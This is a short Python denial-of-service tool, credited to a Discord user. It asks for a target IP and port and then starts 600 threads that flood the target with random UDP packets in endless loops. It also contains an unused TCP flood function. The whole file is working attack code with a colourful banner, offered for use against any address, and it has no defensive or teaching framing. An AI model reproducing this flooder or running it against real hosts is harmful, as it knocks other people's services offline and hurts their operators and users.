#Author: Dot
#Discord: Dot#1035

import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
from colorama import Fore, Back, Style

def at():
	rpks = random._urandom(1016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			a = (str(ip),int(port))
			print("Attacking: " +Fore.RED +ip +Fore.LIGHTBLACK_EX, " | method:" +Fore.GREEN,"UDP" +Fore.LIGHTBLACK_EX, "(default)")
			for x in range(1066):
				s.sendto(rpks,a)
		except:
			s.close()
			print(Fore.LIGHTRED_EX,"ERROR:")
			print("Ip Unreachable...")
			time.sleep(5)

def at2():
	rd = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(rd)
			for x in range(1066):
				s.send(rd)
		except:
			print(Fore.LIGHTRED_EX," ")
			print("")
			print("Ip Unreachable...")
			s.close()


print(Fore.RED,"")
print(" ▄▄▄▄    ▄▄   ▄▄  ▄▄      ▄▄      ▄▄▄▄▄    ▄▄▄▄▄    ▄▄▄▄▄▄ ")
print("▓█████▄  ██  ▓██▒▓██▒    ▓██▒    ▒██▀ ██ ▒██▒  ██▒▒██    ▒ ")
print("▒██▒ ▄██ ██  ▒██░▒██░    ▒██░    ░██   █▌▒██░  ██▒░ ▓██▄   ")
print("▒██░█▀  ▓▓█  ░██░▒██░    ▒██░    ░██   █ ▒██   ██░  ▒   ██▒")
print("░▓█  ▀█▓▒▒█████▓ ░██████▒░██████▒░█████▒ ░█████▓▒░▒██████▒▒")
print("░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░")
print(" ░    ░  ░░░ ░ ░   ░ ░     ░ ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  ")
print(" ░         ░         ░  ░    ░  ░   ░        ░ ░        ░  ")
print("      ░                           ░                         ")
print(Fore.LIGHTBLACK_EX,"")
ip = str(input("> Target: "))
port = int(input("> Port: "))
opt = str(input("> Start(y/n): "))


for y in range(600):
	if opt == 'y':
		thr = threading.Thread(target = at)
		thr.start()
	else:
		sys.exit()
